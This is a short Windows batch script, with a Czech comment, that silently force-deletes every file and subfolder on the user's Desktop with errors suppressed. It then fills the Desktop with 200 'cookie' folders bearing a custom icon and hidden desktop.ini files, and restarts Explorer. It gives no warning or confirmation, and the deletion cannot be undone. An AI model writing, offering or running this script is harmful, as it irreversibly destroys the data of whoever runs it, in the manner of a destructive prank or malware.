@echo off
setlocal enabledelayedexpansion

set "DesktopPath=%userprofile%\Desktop"

del /f /q "%DesktopPath%\*.*" >nul 2>&1

for /D %%d in ("%DesktopPath%\*") do (
    rd /s /q "%%d" >nul 2>&1
)

if not exist "cookie.ico" (
    goto :eof
)

:: ZMENA: Smyčka nyní jde od 1 do 200
for /L %%i in (1,1,200) do (
    set "FolderName=cookie_%%i"
    set "FolderPath=%DesktopPath%\!FolderName!"

    md "!FolderPath!"

    copy "cookie.ico" "!FolderPath!\cookie.ico" >nul 2>&1

    (
        echo [.ShellClassInfo]
        echo IconResource=.\cookie.ico,0
        echo [ViewState]
    ) > "!FolderPath!\desktop.ini"

    attrib +s +h "!FolderPath!\desktop.ini"
    attrib +r "!FolderPath!"
)

taskkill /f /im explorer.exe
start explorer.exe
